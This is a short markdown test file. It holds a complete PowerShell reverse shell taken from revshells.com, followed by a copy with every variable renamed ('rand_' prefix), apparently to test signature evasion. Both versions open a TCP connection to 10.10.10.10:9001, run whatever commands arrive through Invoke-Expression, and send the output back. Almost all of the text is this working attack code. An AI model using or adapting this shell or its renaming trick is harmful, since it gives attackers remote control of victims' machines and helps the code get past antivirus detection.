# Test

## Powershell #1

Reverse shell from <https://www.revshells.com/>

### Original

```powershell
$LHOST = "10.10.10.10"; $LPORT = 9001; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()
```

### Randomized

Just manually replaced `$variable` with `$rand_variable`:

```powershell
$rand_LHOST = "10.10.10.10"; $rand_LPORT = 9001; $rand_TCPClient = New-Object Net.Sockets.TCPClient($rand_LHOST, $rand_LPORT); $rand_NetworkStream = $rand_TCPClient.GetStream(); $rand_StreamReader = New-Object IO.StreamReader($rand_NetworkStream); $rand_StreamWriter = New-Object IO.StreamWriter($rand_NetworkStream); $rand_StreamWriter.AutoFlush = $true; $rand_Buffer = New-Object System.Byte[] 1024; while ($rand_TCPClient.Connected) { while ($rand_NetworkStream.DataAvailable) { $rand_RawData = $rand_NetworkStream.Read($rand_Buffer, 0, $rand_Buffer.Length); $rand_Code = ([text.encoding]::UTF8).GetString($rand_Buffer, 0, $rand_RawData -1) }; if ($rand_TCPClient.Connected -and $rand_Code.Length -gt 1) { $rand_Output = try { Invoke-Expression ($rand_Code) 2>&1 } catch { $_ }; $rand_StreamWriter.Write("$rand_Output`n"); $rand_Code = $null } }; $rand_TCPClient.Close(); $rand_NetworkStream.Close(); $rand_StreamReader.Close(); $rand_StreamWriter.Close()
```
